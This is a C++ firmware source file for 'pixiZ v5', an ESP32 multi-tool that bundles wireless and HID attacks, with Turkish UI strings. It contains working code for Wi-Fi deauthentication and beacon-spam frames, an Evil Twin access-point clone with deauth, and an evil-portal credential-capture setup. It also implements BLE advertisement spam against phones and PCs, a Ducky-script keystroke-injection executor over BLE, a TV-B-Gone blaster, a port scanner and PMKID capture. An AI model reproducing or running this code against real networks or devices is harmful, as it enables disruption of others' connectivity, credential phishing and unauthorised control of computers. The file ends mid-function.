/*
 * pixiZ v5 — Universal Multi-Tool Remote
 * PolyCast5 + Flipper Zero + Bruce + Marauder hybrid
 * ESP32 DevKit V4
 * github.com/azerenes/pixiZ-v1
 *
 * Modül ekleyince .ino'da ENABLE_xxx = 1 yap.
 */

#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <IRremote.h>
#include <Preferences.h>
#include <HijelHID_BLEKeyboard.h>
#include <WiFi.h>
#include <WiFiClient.h>
#include <WebServer.h>
#include <WiFiUdp.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_now.h>
#include <NimBLEDevice.h>
#include <qrcode.h>

// ═══════════════════════════════════════════════════
//  KONFIGURASYON
// ═══════════════════════════════════════════════════

#define TFT_CS    5
#define TFT_RST   16
#define TFT_DC    17
#define BTN_UP    32
#define BTN_DOWN  33
#define BTN_OK    14
#define BTN_MENU  12
#define IR_RECV   13
#define IR_SEND   27

#define ENABLE_IR       1
#define ENABLE_BT       1
#define ENABLE_HACK     1
#define ENABLE_BLESPAM  1
#define ENABLE_BLESCAN  1
#define ENABLE_BADUSB   1
#define ENABLE_TVBGONE  1
#define ENABLE_ESPNOW   1
#define ENABLE_PASS     1
#define ENABLE_OTA      0
#define ENABLE_NFC      0
#define ENABLE_SUBGHZ   0
#define ENABLE_LORA     0
#define ENABLE_SD       0

#ifndef ST77XX_GREY
#define ST77XX_GREY  0x7BEF
#endif
#ifndef ST77XX_CYAN
#define ST77XX_CYAN  0x07FF
#endif
#ifndef ST77XX_MAGENTA
#define ST77XX_MAGENTA 0xF81F
#endif

#define MAX_REMOTES   20
#define MAX_BTNS      16
#define MAX_PASS      20
#define MAX_NAME      20
#define MAX_BNAME     14
#define MAX_PLEN      32
#define MAX_PAYLOADS  10
#define MAX_PLOAD_LEN 256
#define MAX_SSID_LIST 20
#define MAX_AP_LIST   20

// ═══════════════════════════════════════════════════
//  GLOBALS
// ═══════════════════════════════════════════════════

Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);
Preferences prefs;

#if ENABLE_BT
HijelHID_BLEKeyboard bleKeyboard("pixiZ Remote", "pixiZ", 100);
#endif

// --- IR ---
struct IRBtn { char name[MAX_BNAME]; uint16_t addr, cmd; uint8_t proto; };
struct Remote { char name[MAX_NAME]; int bc; IRBtn btns[MAX_BTNS]; };
Remote rmt[MAX_REMOTES];
int rmtN = 0;

#if ENABLE_PASS
struct PEntry { char svc[MAX_NAME], user[MAX_NAME], pass[MAX_PLEN]; };
PEntry passes[MAX_PASS];
int passN = 0;
#endif

#if ENABLE_BADUSB
struct Payload { char name[MAX_NAME]; char script[MAX_PLOAD_LEN]; };
Payload plds[MAX_PAYLOADS];
int pldN = 0;
bool pldRunning = false;
int pldLine = 0;
unsigned long pldDelay = 0;
#endif

// --- Wi-Fi attacks ---
volatile bool beaconRunning = false;
volatile bool deauthRunning = false;
volatile bool deauthDetect = false;
volatile bool pmkidRunning = false;
volatile bool probeSniff = false;
volatile bool evilTwinRunning = false;
volatile bool apCloneRunning = false;
unsigned long beaconTimer = 0;
unsigned long deauthTimer = 0;
int beaconCount = 0, deauthCount = 0, pmkidCount = 0, probeCount = 0;
char deauthTarget[18] = "FF:FF:FF:FF:FF:FF";
char evilSSID[33] = "FreeWiFi";
uint8_t deauthMac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
bool evilTwinActive = false;
int evilScanList = 0;
char evilScanAPs[20][33];
char evilScanBSSID[20][18];
int evilScanRSSI[20];
int evilScanCh[20];
int evilScanEnc[20];
char evilTargetSSID[33] = "";
char evilTargetBSSID[18] = "";
volatile bool deauthAlert = false;

bool portScanRunning = false;
int portScanTarget[4];
int portScanPorts[] = {21,22,23,25,53,80,110,143,443,445,993,995,8080,8443,3306,3389,5900,6379,27017};
int portScanOpen[19];
int portScanOpenN = 0;
int portScanIdx = 0;
unsigned long portScanTimer = 0;

char qrText[128] = "";

// --- RAW Sniffer ---
bool rawSniffRunning = false;
struct RawPkt { char src[18], dst[18]; uint8_t type; unsigned long t; };
RawPkt rawBuf[10];
volatile int rawBufIdx = 0;

// --- Evil Portal ---
bool portalRunning = false;
char portalCreds[5][64];
int portalCredN = 0;
IPAddress portalIP(192,168,4,1);
WebServer* portalServer = NULL;
WiFiUDP* dnsServer = NULL;
char portalSSID[33] = "FreeWiFi";
unsigned long portalTimer = 0;

// --- AirTag Sniff ---
bool airtagRunning = false;
int airtagCount = 0;
char airtagDevices[10][18];

// --- ESP-NOW ---
bool espnowRunning = false;
bool espnowInit = false;
char espnowMsg[128] = "";
char espnowRecv[5][64];
int espnowRecvN = 0;
uint8_t espnowPeer[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

// --- ARP Spoofing ---
bool arpRunning = false;
int arpSent = 0;
uint8_t arpTargetIP[4] = {192,168,1,1};
char arpFakeMAC[18] = "AA:BB:CC:DD:EE:FF";

// --- BLE spam ---
bool bleSpamRunning = false;
int bleSpamType = 0; // 0=iOS 1=Samsung 2=Windows 3=Android 4=All
NimBLEAdvertising* bleAdv = NULL;

// --- BLE scan ---
bool bleScanRunning = false;

// --- TV-B-Gone ---
bool tvbgRunning = false;
int tvbgIdx = 0;
unsigned long tvbgTimer = 0;

// --- IR RAW ---
bool irRawMode = false;
int irRawSt = 0;
uint16_t irRawBuf[200];
int irRawLen = 0;

// --- UI ---
int pg = 0;
int sel = 0, sel2 = 0, sel3 = 0;
bool lrn = false;
int lrnSt = 0, lrnRmt = -1;
IRData irRes;
char tName[MAX_BNAME];
unsigned long lastBtn = 0;
const int DB = 200;

char wifiSSIDs[10][33];
int wifiN = 0;
unsigned long wifiScanStart = 0;
bool wifiScanning = false;

// ═══════════════════════════════════════════════════
//  UI YARDIMCILAR
// ═══════════════════════════════════════════════════

void hdr(const char* s, uint16_t c) {
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 160, 20, c);
  tft.drawFastHLine(0, 20, 160, c>>1&0x7BEF);
  tft.setTextSize(1); tft.setTextColor(ST77XX_WHITE);
  tft.setCursor((160-strlen(s)*6)/2, 5); tft.print(s);
}

void ftr(const char* s) {
  tft.fillRect(0, 118, 160, 10, ST77XX_BLACK);
  tft.setTextSize(1); tft.setTextColor(ST77XX_GREY);
  tft.setCursor(2, 119); tft.print(s);
}

void mi(int idx, int total, int y0, int h, uint16_t col, int selIdx, const char* txt) {
  int y = y0 + idx*h;
  bool s = idx==selIdx;
  tft.fillRect(6, y, 148, h-4, s ? col : ST77XX_BLACK);
  if (s) tft.drawRoundRect(6, y, 148, h-4, 4, col);
  else tft.drawRoundRect(6, y, 148, h-4, 4, ST77XX_GREY);
  tft.setTextColor(s ? ST77XX_BLACK : ST77XX_WHITE);
  tft.setCursor(16, y+5); tft.print(txt);
}

void stLabel(int x, int y, const char* l, const char* v, uint16_t lc, uint16_t vc) {
  tft.setTextColor(lc); tft.setCursor(x, y); tft.print(l);
  tft.setTextColor(vc); tft.print(v ? v : "");
}

bool up() { return digitalRead(BTN_UP) == LOW; }
bool down() { return digitalRead(BTN_DOWN) == LOW; }
bool ok() { return digitalRead(BTN_OK) == LOW; }
bool menu() { return digitalRead(BTN_MENU) == LOW; }

// ═══════════════════════════════════════════════════
//  STORAGE
// ═══════════════════════════════════════════════════

void stInit() { prefs.begin("pixiZ", false); }

void ldIR() {
  rmtN = prefs.getInt("rc", 0);
  if (rmtN > MAX_REMOTES) rmtN = MAX_REMOTES;
  for (int r = 0; r < rmtN; r++) {
    char k[20];
    sprintf(k, "rn%d", r); String n = prefs.getString(k, "Rmt");
    strncpy(rmt[r].name, n.c_str(), MAX_NAME-1); rmt[r].name[MAX_NAME-1]=0;
    sprintf(k, "rb%d", r); rmt[r].bc = prefs.getInt(k, 0);
    if (rmt[r].bc > MAX_BTNS) rmt[r].bc = MAX_BTNS;
    for (int b = 0; b < rmt[r].bc; b++) {
      sprintf(k, "r%db%dn", r, b); String bn = prefs.getString(k, "Btn");
      strncpy(rmt[r].btns[b].name, bn.c_str(), MAX_BNAME-1); rmt[r].btns[b].name[MAX_BNAME-1]=0;
      sprintf(k, "r%db%da", r, b); rmt[r].btns[b].addr = prefs.getUShort(k, 0);
      sprintf(k, "r%db%dc", r, b); rmt[r].btns[b].cmd = prefs.getUShort(k, 0);
      sprintf(k, "r%db%dp", r, b); rmt[r].btns[b].proto = prefs.getUChar(k, 0);
    }
  }
}
void svIR() {
  prefs.putInt("rc", rmtN);
  for (int r = 0; r < rmtN; r++) {
    char k[20];
    sprintf(k, "rn%d", r); prefs.putString(k, rmt[r].name);
    sprintf(k, "rb%d", r); prefs.putInt(k, rmt[r].bc);
    for (int b = 0; b < rmt[r].bc; b++) {
      sprintf(k, "r%dbn", r, b); prefs.putString(k, rmt[r].btns[b].name);
      sprintf(k, "r%db%da", r, b); prefs.putUShort(k, rmt[r].btns[b].addr);
      sprintf(k, "r%db%dc", r, b); prefs.putUShort(k, rmt[r].btns[b].cmd);
      sprintf(k, "r%db%dp", r, b); prefs.putUChar(k, rmt[r].btns[b].proto);
    }
  }
}
void clrIR() { rmtN = 0; prefs.putInt("rc", 0); }

#if ENABLE_BADUSB
void ldPayloads() {
  pldN = prefs.getInt("pn", 0);
  if (pldN > MAX_PAYLOADS) pldN = MAX_PAYLOADS;
  for (int i = 0; i < pldN; i++) {
    char k[16];
    sprintf(k, "pln%d", i); String n = prefs.getString(k, "Pld");
    strncpy(plds[i].name, n.c_str(), MAX_NAME-1); plds[i].name[MAX_NAME-1]=0;
    sprintf(k, "pls%d", i); String s = prefs.getString(k, "");
    strncpy(plds[i].script, s.c_str(), MAX_PLOAD_LEN-1); plds[i].script[MAX_PLOAD_LEN-1]=0;
  }
}
void svPayloads() {
  prefs.putInt("pn", pldN);
  for (int i = 0; i < pldN; i++) {
    char k[16];
    sprintf(k, "pln%d", i); prefs.putString(k, plds[i].name);
    sprintf(k, "pls%d", i); prefs.putString(k, plds[i].script);
  }
}
#endif

// ═══════════════════════════════════════════════════
//  WI-FI PROMISCUOUS / RAW FRAME
// ═══════════════════════════════════════════════════

void wifiSniffCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* f = pkt->payload;
  uint16_t fc = f[0] | (f[1] << 8);
  uint8_t stype = (fc >> 4) & 0x0F;
  uint8_t typef = (fc >> 2) & 0x03;

  // Probe request (type=0 stype=4)
  if (typef == 0 && stype == 4 && probeSniff) {
    probeCount++;
    if (probeCount <= 100) {
      // Find SSID in probe request (starts at offset 24 + variable tags)
      int off = 24;
      while (off < pkt->rx_ctrl.sig_len - 2) {
        if (f[off] == 0x00 && off + 2 + f[off+1] <= pkt->rx_ctrl.sig_len) {
          break;
        }
        off++;
      }
      if (off + 2 < pkt->rx_ctrl.sig_len && f[off] == 0x00) {
        int slen = f[off+1];
        if (slen > 0 && slen < 33 && off+2+slen <= pkt->rx_ctrl.sig_len) {
          // Got probe SSID — could display if we had more UI space
        }
      }
    }
  }

  // EAPOL (PMKID)
  if (typef == 1 && stype == 8 && pmkidRunning) {
    // Check for EAPOL frame (type 0x88, 0x8e)
    int dLen = pkt->rx_ctrl.sig_len;
    if (dLen > 54) {
      for (int i = 24; i < dLen-7; i++) {
        if (f[i]==0x88 && f[i+1]==0x8e) { pmkidCount++; break; }
      }
    }
  }

  // Deauth detector (type=0 stype=12)
  if (typef == 0 && stype == 12 && deauthDetect) {
    deauthCount++;
    if (deauthCount <= 3) deauthAlert = true;
  }

  // RAW Sniffer — store packet info
  if (rawSniffRunning) {
    RawPkt* p = &rawBuf[rawBufIdx % 10];
    snprintf(p->src, 18, "%02X:%02X:%02X:%02X:%02X:%02X", f[10],f[11],f[12],f[13],f[14],f[15]);
    snprintf(p->dst, 18, "%02X:%02X:%02X:%02X:%02X:%02X", f[4],f[5],f[6],f[7],f[8],f[9]);
    p->type = fc >> 4;
    p->t = millis();
    rawBufIdx++;
  }
}

void startPromiscuous() {
  WiFi.mode(WIFI_AP);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_callback(&wifiSniffCallback);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
}

void stopPromiscuous() {
  esp_wifi_set_promiscuous(false);
}

void sendRawFrame(uint8_t* buf, int len) {
  esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
}

void sendBeaconFrame(const char* ssid, uint8_t channel) {
  uint8_t beacon[128] = {0};
  int pos = 0;
  // Frame control: Beacon
  beacon[pos++] = 0x80; beacon[pos++] = 0x00;
  // Duration
  beacon[pos++] = 0x00; beacon[pos++] = 0x00;
  // DA: broadcast
  beacon[pos++] = 0xFF; beacon[pos++] = 0xFF; beacon[pos++] = 0xFF;
  beacon[pos++] = 0xFF; beacon[pos++] = 0xFF; beacon[pos++] = 0xFF;
  // SA: random
  uint8_t r = esp_random() & 0xFF;
  beacon[pos++] = r; beacon[pos++] = 0xAA; beacon[pos++] = 0xBB;
  beacon[pos++] = 0xCC; beacon[pos++] = 0xDD; beacon[pos++] = 0xEE;
  // BSSID
  beacon[pos++] = r; beacon[pos++] = 0xAA; beacon[pos++] = 0xBB;
  beacon[pos++] = 0xCC; beacon[pos++] = 0xDD; beacon[pos++] = 0xEE;
  // Sequence
  beacon[pos++] = 0x00; beacon[pos++] = 0x00;
  // Timestamp
  for (int i = 0; i < 8; i++) beacon[pos++] = 0;
  // Beacon interval
  beacon[pos++] = 0x64; beacon[pos++] = 0x00;
  // Capabilities
  beacon[pos++] = 0x01; beacon[pos++] = 0x04;
  // SSID tag
  int slen = strlen(ssid);
  if (slen > 32) slen = 32;
  beacon[pos++] = 0x00; beacon[pos++] = slen;
  memcpy(&beacon[pos], ssid, slen); pos += slen;
  // Supported rates
  beacon[pos++] = 0x01; beacon[pos++] = 0x08;
  beacon[pos++] = 0x82; beacon[pos++] = 0x84; beacon[pos++] = 0x8B;
  beacon[pos++] = 0x96; beacon[pos++] = 0x0C; beacon[pos++] = 0x12;
  beacon[pos++] = 0x18; beacon[pos++] = 0x24;
  // Channel tag
  beacon[pos++] = 0x03; beacon[pos++] = 0x01; beacon[pos++] = channel;
  // DSSS
  beacon[pos++] = 0x05; beacon[pos++] = 0x04;
  beacon[pos++] = 0x01; beacon[pos++] = 0x02; beacon[pos++] = 0x00; beacon[pos++] = 0x00;

  sendRawFrame(beacon, pos);
}

void sendDeauthFrame(uint8_t* targetMac, uint8_t* apMac) {
  uint8_t deauth[26] = {0};
  int pos = 0;
  // Frame control: Deauth
  deauth[pos++] = 0xC0; deauth[pos++] = 0x00;
  // Duration
  deauth[pos++] = 0x00; deauth[pos++] = 0x00;
  // DA
  memcpy(&deauth[pos], targetMac, 6); pos += 6;
  // SA
  memcpy(&deauth[pos], apMac, 6); pos += 6;
  // BSSID
  memcpy(&deauth[pos], apMac, 6); pos += 6;
  // Sequence
  deauth[pos++] = 0x00; deauth[pos++] = 0x00;
  // Reason code: class 3 frame
  deauth[pos++] = 0x07; deauth[pos++] = 0x00;

  sendRawFrame(deauth, pos);
}

// ═══════════════════════════════════════════════════
//  BLE SPAM
// ═══════════════════════════════════════════════════

void bleSpamStart(int type) {
  if (bleAdv) { bleAdv->stop(); }
  bleAdv = NimBLEDevice::getAdvertising();
  bleAdv->stop();

  NimBLEAdvertisementData d;
  uint8_t raw[31];
  int len = 0;

  // Flags
  raw[len++] = 2; raw[len++] = 1; raw[len++] = 0x06;

  // Manufacturer data per platform
  switch (type) {
    case 0: { // iOS / Apple Continuity
      uint8_t mfg[] = {0x4C,0x00,0x07,0x0A,0x01,0x02,0x03,0x04,0x05,0x06,0x07,
                       0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F,0x10,0x11,0x12,
                       0x13,0x14,0x15,0x16,0x17,0x18,0x19};
      raw[len++] = 1 + sizeof(mfg); raw[len++] = 0xFF;
      memcpy(raw+len, mfg, sizeof(mfg)); len += sizeof(mfg);
      break;
    }
    case 1: { // Samsung
      uint8_t mfg[] = {0x75,0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,
                       0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F,0x10,
                       0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1A};
      raw[len++] = 1 + sizeof(mfg); raw[len++] = 0xFF;
      memcpy(raw+len, mfg, sizeof(mfg)); len += sizeof(mfg);
      break;
    }
    case 2: { // Windows
      uint8_t mfg[] = {0x06,0x00,0x03,0x01,0x02,0x03,0x04,0x05,0x06,0x07,
                       0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F,0x10,0x11,
                       0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19};
      raw[len++] = 1 + sizeof(mfg); raw[len++] = 0xFF;
      memcpy(raw+len, mfg, sizeof(mfg)); len += sizeof(mfg);
      break;
    }
    case 3: { // Android Fast Pair
      uint8_t mfg[] = {0x4C,0x00,0x0C,0x01,0x02,0x03,0x04,0x05,0x06,0x07,
                       0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F,0x10,0x11,
                       0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19};
      raw[len++] = 1 + sizeof(mfg); raw[len++] = 0xFF;
      memcpy(raw+len, mfg, sizeof(mfg)); len += sizeof(mfg);
      break;
    }
  }

  d.addData(std::string((char*)raw, len));
  bleAdv->setAdvertisementData(d);
  bleAdv->start();
  bleSpamRunning = true;
  bleSpamType = type;
}

void bleSpamStop() {
  if (bleAdv) { bleAdv->stop(); }
  bleSpamRunning = false;
}

// ═══════════════════════════════════════════════════
//  TV-B-GONE (IR)
// ═══════════════════════════════════════════════════

// Simplified TV-B-Gone with common Samsung/LG/Sony/Philips power codes
const uint16_t tvbgCodes[] = {
  0xE0E040BF, // Samsung power
  0x20DF10EF, // LG power
  0xA55A,     // Sony power
  0x0C,       // Philips RC5 power
  0x0D,       // Philips RC6 power
  0xE0E0E01F, // Samsung toggle
  0x807F,     // Panasonic power
  0xE13E,     // Toshiba power
  0xBA45,     // Sharp power
  0x0F,       // NEC power (many brands)
  0xBC,       // Mitsubishi
  0x1C,       // JVC
  0x1E,       // Zenith
  0x1F,       // RCA
};

void tvbgSend() {
  for (int i = 0; i < 5; i++) {
    for (int j = 0; j < (int)(sizeof(tvbgCodes)/sizeof(tvbgCodes[0])); j++) {
      sendIR(0x00, tvbgCodes[j], NEC);
      delay(5);
    }
  }
}

// ═══════════════════════════════════════════════════
//  BADUSB (DUCKY SCRIPT EXECUTOR)
// ═══════════════════════════════════════════════════

#if ENABLE_BADUSB
void badUsbRun(const char* script) {
  if (!bleKeyboard.isConnected()) return;
  pldRunning = true;
  int pos = 0;
  char line[64];
  int ln = 0;

  while (script[pos] && pldRunning) {
    int lp = 0;
    while (script[pos] && script[pos] != '\n' && lp < 63) {
      line[lp++] = script[pos++];
    }
    line[lp] = 0;
    if (script[pos] == '\n') pos++;

    // Skip empty lines
    if (lp == 0) continue;

    // Parse commands
    if (strncmp(line, "DELAY ", 6) == 0) {
      int ms = atoi(line + 6);
      delay(ms);
    } else if (strncmp(line, "STRING ", 7) == 0) {
      bleKeyboard.print(line + 7);
    } else if (strcmp(line, "ENTER") == 0) {
      bleKeyboard.write(KEY_RETURN);
    } else if (strcmp(line, "GUI r") == 0 || strcmp(line, "WIN r") == 0) {
      bleKeyboard.press(KEY_LEFT_GUI); delay(50); bleKeyboard.press('r');
      delay(50); bleKeyboard.releaseAll();
    } else if (strcmp(line, "GUI d") == 0) {
      bleKeyboard.press(KEY_LEFT_GUI); delay(50); bleKeyboard.press('d');
      delay(50); bleKeyboard.releaseAll();
    } else if (strcmp(line, "GUI l") == 0) {
      bleKeyboard.press(KEY_LEFT_GUI); delay(50); bleKeyboard.press('l');
      delay(50); bleKeyboard.releaseAll();
    } else if (strcmp(line, "SPACE") == 0) {
      bleKeyboard.write(' ');
    } else if (strcmp(line, "TAB") == 0) {
      bleKeyboard.write(KEY_TAB);
    } else if (strcmp(line, "ESC") == 0) {
      bleKeyboard.write(KEY_ESC);
    } else if (strcmp(line, "UP") == 0) {
      bleKeyboard.write(KEY_UP_ARROW);
    } else if (strcmp(line, "DOWN") == 0) {
      bleKeyboard.write(KEY_DOWN_ARROW);
    } else if (strcmp(line, "LEFT") == 0) {
      bleKeyboard.write(KEY_LEFT_ARROW);
    } else if (strcmp(line, "RIGHT") == 0) {
      bleKeyboard.write(KEY_RIGHT_ARROW);
    } else if (strcmp(line, "CTRL-ALT-DEL") == 0) {
      bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press(KEY_LEFT_ALT);
      delay(50); bleKeyboard.write(KEY_DELETE); bleKeyboard.releaseAll();
    } else if (strcmp(line, "CTRL-SHIFT-ESC") == 0) {
      bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press(KEY_LEFT_SHIFT);
      delay(50); bleKeyboard.write(KEY_ESC); bleKeyboard.releaseAll();
    } else if (strcmp(line, "ALT-F4") == 0) {
      bleKeyboard.press(KEY_LEFT_ALT); delay(50); bleKeyboard.write(KEY_F4);
      delay(50); bleKeyboard.releaseAll();
    } else if (strcmp(line, "ALT-TAB") == 0) {
      bleKeyboard.press(KEY_LEFT_ALT); delay(50); bleKeyboard.write(KEY_TAB);
      delay(50); bleKeyboard.releaseAll();
    }

    delay(50 + esp_random() % 50); // human-like delay
    ln++;
  }
  pldRunning = false;
}
#endif

// ═══════════════════════════════════════════════════
//  PASSWORD MANAGER
// ═══════════════════════════════════════════════════

#if ENABLE_PASS
void ldPass() {
  passN = prefs.getInt("pc", 0);
  if (passN > MAX_PASS) passN = MAX_PASS;
  for (int i = 0; i < passN; i++) {
    char k[20];
    sprintf(k, "ps%d", i); String n = prefs.getString(k, "");
    strncpy(passes[i].svc, n.c_str(), MAX_NAME-1); passes[i].svc[MAX_NAME-1]=0;
    sprintf(k, "pu%d", i); String u = prefs.getString(k, "");
    strncpy(passes[i].user, u.c_str(), MAX_NAME-1); passes[i].user[MAX_NAME-1]=0;
    sprintf(k, "pp%d", i); String p = prefs.getString(k, "");
    strncpy(passes[i].pass, p.c_str(), MAX_PLEN-1); passes[i].pass[MAX_PLEN-1]=0;
  }
}
void svPass() {
  prefs.putInt("pc", passN);
  for (int i = 0; i < passN; i++) {
    char k[20];
    sprintf(k, "ps%d", i); prefs.putString(k, passes[i].svc);
    sprintf(k, "pu%d", i); prefs.putString(k, passes[i].user);
    sprintf(k, "pp%d", i); prefs.putString(k, passes[i].pass);
  }
}
#endif

// ═══════════════════════════════════════════════════
//  QR CODE GENERATOR
// ═══════════════════════════════════════════════════

void drawQR(const char* text) {
  pg = 35; hdr("QR KOD", ST77XX_CYAN);
  if (!text || strlen(text) == 0) {
    tft.setTextColor(ST77XX_GREY); tft.setCursor(8, 50);
    tft.print("QR metni bos."); ftr("MENU=Geri"); return;
  }
  QRCode qrc;
  uint8_t qd[qrcode_getBufferSize(3)];
  qrcode_initText(&qrc, qd, 3, 0, text);
  int sz = qrc.size;
  int bs = (sz > 25) ? 2 : 3;
  int offx = (160 - sz*bs) / 2;
  int offy = (128 - sz*bs) / 2;
  if (offy < 22) { offy = 22; bs = (128-22)/sz; offx = (160 - sz*bs)/2; }
  for (int r = 0; r < sz; r++) {
    for (int c = 0; c < sz; c++) {
      tft.fillRect(offx + c*bs, offy + r*bs, bs, bs,
                   qrcode_getModule(&qrc, r, c) ? ST77XX_WHITE : ST77XX_BLACK);
    }
  }
  ftr("MENU=Geri");
}

// ═══════════════════════════════════════════════════
//  EVIL TWIN (AP CLONE + DEAUTH)
// ═══════════════════════════════════════════════════

void drawEvilScan() {
  pg = 19; hdr("EVIL TWIN", ST77XX_RED);
  tft.setTextColor(ST77XX_YELLOW); tft.setCursor(8, 24); tft.print("WiFi aglari taniyor...");
  ftr("MENU=Iptal");
  WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(100);
  int n = WiFi.scanNetworks();
  if (n > 20) n = 20;
  evilScanList = n;
  for (int i = 0; i < n; i++) {
    strncpy(evilScanAPs[i], WiFi.SSID(i).c_str(), 32); evilScanAPs[i][32]=0;
    strncpy(evilScanBSSID[i], WiFi.BSSIDstr(i).c_str(), 17); evilScanBSSID[i][17]=0;
    evilScanRSSI[i] = WiFi.RSSI(i);
    evilScanCh[i] = WiFi.channel(i);
    evilScanEnc[i] = WiFi.encryptionType(i);
  }
  WiFi.scanDelete();
  tft.fillScreen(ST77XX_BLACK);
  hdr("EVIL TWIN", ST77XX_RED);
  if (evilScanList == 0) {
    tft.setTextColor(ST77XX_GREY); tft.setCursor(8, 50); tft.print("Ag bulunamadi.");
    ftr("MENU=Geri"); return;
  }
  for (int i = 0; i < evilScanList && i < 5; i++) {
    int y = 24+i*19; bool s = i==sel2;
    tft.fillRect(2, y, 156, 17, s ? ST77XX_RED : ST77XX_BLACK);
    if (s) tft.drawRoundRect(2, y, 156, 17, 3, ST77XX_RED);
    tft.setTextColor(s ? ST77XX_BLACK : ST77XX_WHITE);
    tft.setCursor(6, y+4); tft.print(evilScanAPs[i]);
    tft.setTextColor(ST77XX_GREY);
    tft.setCursor(126, y+4); tft.printf("%d", evilScanRSSI[i]);
  }
  ftr("OK=Sec  UP/DOWN=Gez  MENU=Geri");
}

void drawEvilRunning() {
  pg = 20; hdr("EVIL TWIN", ST77XX_RED);
  tft.setTextColor(ST77XX_CYAN); tft.setCursor(8, 30); tft.print("Hedef: ");
  tft.setTextColor(ST77XX_WHITE); tft.print(evilTargetSSID);
  tft.setCursor(8, 48); tft.setTextColor(ST77XX_CYAN); tft.print("BSSID: ");
  tft.setTextColor(ST77XX_WHITE); tft.print(evilTargetBSSID);
  tft.setTextColor(evilTwinActive ? ST77XX_GREEN : ST77XX_YELLOW);
  tft.setCursor(8, 70); tft.print(evilTwinActive ? "SALDIRI AKTIF" : "DURDU");
  tft.setCursor(8, 88); tft.setTextColor(ST77XX_GREY);
  tft.print("Cloned AP + deauth calisiyor.");
  ftr("OK=Ac/Kapat  MENU=Cikis");
}

void startEvilTwin() {
  if (strlen(evilTargetSSID) == 0) return;
  WiFi.mode(WIFI_MODE_NULL); delay(100);
  WiFi.softAP(evilTargetSSID, NULL, evilScanCh[sel2], 0, 1);
  delay(500);
  WiFi.mode(WIFI_AP);
  esp_wifi_set_promiscuous(true);
  evilTwinActive = true;
}

void stopEvilTwin() {
  esp_wifi_set_promiscuous(false);
  WiFi.softAPdisconnect(true);
  evilTwinActive = false;
}

void actEvilTwin() {
  if (pg == 19) {
    if (menu()) { pg=12; drawHackMenu(); }
    else if (ok() && evilScanList > 0) {
      strcpy(evilTargetSSID, evilScanAPs[sel2]);
      strcpy(evilTargetBSSID, evilScanBSSID[sel2]);
      drawEvilRunning();
    }
    else if (up()) { if (sel2>0) sel2--; drawEvilScan(); }
    else if (down()) { if (sel2<evilScanList-1) sel2++; drawEvilScan(); }
  } else if (pg == 20) {
    if (menu()) { stopEvilTwin(); pg=12; drawHackMenu(); }
    else if (ok()) {
      if (!evilTwinActive) startEvilTwin();
      else stopEvilTwin();
      drawEvilRunning();
    }
  }
}

// ═══════════════════════════════════════════════════
//  PORT SCANNER
// ═══════════════════════════════════════════════════

void drawPortScan() {
  pg = 21; hdr("PORT TARAMA", ST77XX_RED);
  if (portScanRunning) {
    tft.setTextColor(ST77XX_YELLOW); tft.setCursor(8, 30);
    tft.printf("Taniyor: %d", portScanPorts[portScanIdx]);
    tft.setCursor(8, 50); tft.setTextColor(ST77XX_GREEN);
    tft.printf("Acik: %d", portScanOpenN);
    ftr("MENU=Durdur"); return;
  }
  tft.setTextColor(ST77XX_CYAN); tft.setCursor(8, 30);
  tft.print("Hedef: ");
  tft.setTextColor(ST77XX_WHITE);
  tft.printf("%d.%d.%d.%d", portScanTarget[0],portScanTarget[1],portScanTarget[2],portScanTarget[3]);
  tft.setCursor(8, 50); tft.setTextColor(ST77XX_GREEN);
  tft.printf("Acik port: %d", portScanOpenN);
  int y = 68;
  for (int i = 0; i < portScanOpenN && i < 3; i++) {
    tft.setTextColor(ST77XX_WHITE); tft.setCursor(8, y);
    tft.printf("Port %d", portScanOpen[i]); y += 14;
  }
  if (portScanOpenN > 3) {
    tft.setTextColor(ST77XX_GREY); tft.setCursor(8, y);
    tft.printf("+%d daha", portScanOpenN-3);
  }
  ftr("OK=Baslat  MENU=Geri");
}

void doPortScan() {
  portScanRunning = true;
  portScanIdx = 0;
  portScanOpenN = 0;
  int nPorts = sizeof(portScanPorts)/sizeof(portScanPorts[0]);

  for (int i = 0; i < nPorts && portScanRunning; i++) {
    portScanIdx = i;
    WiFiClient c;
    char host[16];
    sprintf(host, "%d.%d.%d.%d", portScanTarget[0],portScanTarget[1],portScanTarget[2],portScanTarget[3]);
    if (c.connect(host, portScanPorts[i], 1500)) {
      if (portScanOpenN < 19) portScanOpen[portScanOpenN++] = portScanPorts[i];
      c.stop();
    }
    // Update display every 5 ports
    if (i % 5 == 0 && pg == 21) {
      tft.fillRect(0, 24, 160, 30, ST77XX_BLACK);
      tft.setTextColor(ST77XX_YELLOW); tft.setCursor(8, 30);
      tft.printf("Taniyor: %d/%d", i+1, nPorts);
      tft.setCursor(8, 50); tft.setTextColor(ST77XX_GREEN);
      tft.printf("Acik: %d", portScanOpenN);
    }
  }
  portScanRunning = false;
  if (pg == 21) drawPortScan();
}

// ═══════════════════════════════════════════════════
//  ENHANCED WIFI SCANNER (BEACON SNIFF)
// ═══════════════════════════════════════════════════

void drawBeaconSniff() {
  pg = 36; hdr("BEACON SNIFF", ST77XX_CYAN);
  tft.setTextColor(ST77XX_YELLOW); tft.setCursor(8, 24);
